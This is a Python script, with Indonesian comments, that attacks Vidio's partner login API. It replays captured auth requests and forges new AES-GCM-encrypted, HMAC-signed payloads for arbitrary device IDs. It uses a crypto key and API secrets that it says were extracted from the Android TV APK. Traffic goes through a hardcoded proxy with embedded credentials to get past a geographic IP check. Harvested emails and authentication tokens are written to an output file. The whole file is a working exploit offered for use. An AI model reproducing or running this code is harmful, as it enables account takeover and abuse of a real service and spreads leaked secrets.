#!/usr/bin/env python3
"""Vidio partner (seamless) relogin.

Dua mode:
1. Replay capture   : kirim ulang request /api/partner/auth yang sudah di-capture
                      (format JSON berisi CURLOPT_POSTFIELDS + CURLOPT_HTTPHEADER).
2. Generate payload : bikin data+signature baru untuk unique_id apa pun
                      (kunci AES & keyId diekstrak dari libndkconfig.so APK 2608.2.4).

Semua request lewat proxy Indonesia (dataimpulse) — server menolak IP non-ID.
"""

import base64
import http.client
import json
import os
import re
import sys
from urllib.parse import urlsplit

HOST = "api.vidio.com"
PATH = "/api/partner/auth"

PROXY_URL = "http://46b0ff892fc1d3075320__cr.id:66c757e644710948@gw.dataimpulse.com:823"
_proxy = urlsplit(PROXY_URL)
PROXY_AUTH_HEADER = "Basic " + base64.b64encode(
    f"{_proxy.username}:{_proxy.password}".encode()
).decode()

# --- kripto (diekstrak dari APK) -------------------------------------------
PARTNER_KEY = base64.b64decode("O8NAJlk7o7GNeNn01qUXxjezrD/Z2djOMjSizTRZt1U=")
KEY_ID = "ZXhDgP7RixaP"

from Crypto.Cipher import AES  # noqa: E402  (pip install pycryptodome)
from Crypto.Hash import HMAC, SHA256  # noqa: E402


def _b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


def _hmac(key: bytes, msg: bytes) -> bytes:
    return HMAC.new(key, msg, SHA256).digest()


def gen_payload(unique_id: str, partner_agent: str = "coocaa_SW3_ATV_T"):
    """Bikin (body, headers) untuk POST /api/partner/auth.

    Meniru z10.b di APK:
      data      = base64( AES-GCM(plaintext) || tag || iv )
      signature = base64(iv)[:-1] + base64(hmac2) + base64(iv)[-1]
      hmac2     = HMAC-SHA256( HMAC-SHA256(key, utf8_lossy(iv)), plaintext )
    """
    import os as _os

    # ponytail: IV dipaksa byte ASCII printable supaya dekode UTF-8 Java
    # (new String(iv, UTF8)) identik dengan Python — hindari mismatch HMAC.
    iv = bytes(_os.urandom(12)[i] % 95 + 32 for i in range(12))
    plaintext = json.dumps(
        {"unique_id": unique_id, "partner_agent": partner_agent},
        separators=(",", ":"),
    ).encode()

    cipher = AES.new(PARTNER_KEY, AES.MODE_GCM, nonce=iv)
    ct, tag = cipher.encrypt_and_digest(plaintext)
    body = json.dumps({"data": _b64(ct + tag + iv)}, separators=(",", ":"))

    # Java: new String(iv, UTF8).getBytes(UTF8) — lossy, tiru dengan 'replace'
    iv_lossy = iv.decode("utf-8", "replace").encode("utf-8")
    hmac2 = _hmac(_hmac(PARTNER_KEY, iv_lossy), plaintext)
    iv_b64 = _b64(iv)
    signature = iv_b64[:-1] + _b64(hmac2) + iv_b64[-1]

    headers = {
        "User-Agent": "tv-android/2608.2.4 (1020)",
        "Accept-Encoding": "gzip",
        "signature": f'keyId="{KEY_ID}",signature="{signature}"',
        "x-api-platform": "tv-android",
        "x-api-auth": "laZOmogezono5ogekaso5oz4Mezimew1",
        "x-api-app-info": "tv-android/16/2608.2.4-1020",
        "Content-Type": "application/json; charset=UTF-8",
        "Content-Length": str(len(body)),
    }
    return body, headers


def post_partner_auth(body, headers):
    """POST /api/partner/auth lewat proxy ID. Return (status, dict/None)."""
    conn = http.client.HTTPSConnection(_proxy.hostname, _proxy.port, timeout=30)
    try:
        conn.set_tunnel(HOST, 443, headers={"Proxy-Authorization": PROXY_AUTH_HEADER})
        conn.request("POST", PATH, body=body, headers=headers)
        resp = conn.getresponse()
        raw = resp.read()
        if resp.getheader("Content-Encoding") == "gzip":
            import gzip

            raw = gzip.decompress(raw)
        try:
            return resp.status, json.loads(raw.decode("utf-8", "replace"))
        except ValueError:
            return resp.status, {"raw": raw[:300].decode("utf-8", "replace")}
    finally:
        conn.close()


def load_capture(path):
    """Parse file capture JSON secara toleran (entry dipisah '{ "brand"')."""
    raw = open(path, encoding="utf-8").read()
    starts = [m.start() for m in re.finditer(r'\{\s*"brand"', raw)]
    entries = []
    for i, s in enumerate(starts):
        end = starts[i + 1] if i + 1 < len(starts) else len(raw)
        chunk = raw[s:end].rstrip().rstrip(",")
        if chunk.endswith("]"):
            chunk = chunk[:-1].rstrip()
        try:
            entries.append(json.loads(chunk))
        except ValueError:
            pass
    return entries


def replay_entry(entry):
    """Replay satu capture. Return (status, resp_dict)."""
    headers = {}
    for h in entry["CURLOPT_HTTPHEADER"]:
        k, v = h.split(": ", 1)
        headers[k.lower()] = v
    headers["Content-Length"] = str(len(entry["CURLOPT_POSTFIELDS"]))
    return post_partner_auth(entry["CURLOPT_POSTFIELDS"], headers)


def extract_auth(resp):
    """Cari email + authentication_token di respons login (rekursif)."""
    result = {}

    def walk(obj):
        if isinstance(obj, dict):
            if "authentication_token" in obj and "email" in obj:
                result.setdefault("email", obj["email"])
                result.setdefault("token", obj["authentication_token"])
            for v in obj.values():
                walk(v)
        elif isinstance(obj, list):
            for v in obj:
                walk(v)

    walk(resp)
    return result


def main():
    capture_file = sys.argv[1] if len(sys.argv) > 1 else "partner_capture.json"
    output_file = sys.argv[2] if len(sys.argv) > 2 else "vidio_accounts_relogin.txt"

    entries = load_capture(capture_file)
    print(f"[*] {len(entries)} capture dimuat dari {capture_file}")

    ok = 0
    with open(output_file, "w", encoding="utf-8") as out:
        for i, e in enumerate(entries, 1):
            email = e.get("email", "?")
            status, resp = replay_entry(e)
            if status == 200:
                auth = extract_auth(resp)
                if auth.get("token"):
                    ok += 1
                    line = (
                        "array(\n"
                        f"    'nomor' => {ok},\n"
                        f"    'email' => '{auth['email']}',\n"
                        f"    'token' => '{auth['token']}',\n"
                        ")"
                    )
                    out.write(line + "\n")
                    out.flush()
                    print(f"[+] {i}. {email} -> 200 OK, token baru disimpan")
                else:
                    print(f"[-] {i}. {email} -> 200 tapi token tidak ditemukan")
            else:
                msg = resp.get("error_message", resp.get("raw", "?")) if resp else "?"
                print(f"[-] {i}. {email} -> HTTP {status}: {msg}")

    print(f"[*] Selesai: {ok}/{len(entries)} berhasil -> {output_file}")


if __name__ == "__main__":
    main()
